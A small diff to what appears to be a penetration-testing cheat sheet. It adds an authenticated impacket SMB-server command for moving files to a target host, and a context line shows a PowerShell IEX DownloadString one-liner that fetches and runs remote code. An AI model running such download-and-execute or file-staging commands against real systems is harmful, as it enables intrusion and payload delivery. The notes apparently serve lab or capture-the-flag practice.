@@ -53,6 +53,9 @@ Invoke-Command -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http
 ==============================================================================
 [+] Transfer files SMB
 ==============================================================================
+# whith Password
+sudo impacket-smbserver smbFolder $(pwd) -smb2support -username usuario -password 123456789a*
+# whith Password
 sudo impacket-smbserver smbFolder $(pwd) -smb2support
 \\10.10.14.20\smbFolder\test.bat test.bat
 
